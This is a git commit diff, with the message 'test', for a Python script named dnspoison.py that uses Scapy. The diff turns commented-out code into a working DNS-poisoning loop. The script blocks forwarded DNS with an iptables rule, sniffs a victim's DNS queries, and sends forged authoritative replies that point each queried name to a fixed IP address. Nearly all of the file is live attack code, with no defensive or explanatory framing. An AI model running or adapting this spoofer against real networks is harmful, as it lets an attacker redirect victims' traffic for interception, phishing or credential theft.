fff0c52c91cfe064e77732c52ce457ea0f285738
m4ul <hansonlucas06@gmail.com>
2022-11-12 19:34:04 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -7,12 +7,11 @@ gotoIP = "10.5.1.3"
 firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
 Popen([firewall], shell=True, stdout=PIPE)
 
-
-a=sniff(count=1, filter="udp and port 53 and host " + victimIP, promisc=1)
-if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-    print (a[0].getlayer(IP).src)
-    #spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
-    #sendp(spoof, count=1)
+while True:
+    a=sniff(count=1, filter="udp and port 53 and host " + victimIP, promisc=1)
+    if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
+        spoof = (Ether())/IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, aa = 1, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
+        sendp(spoof, count=1)
     
 
 
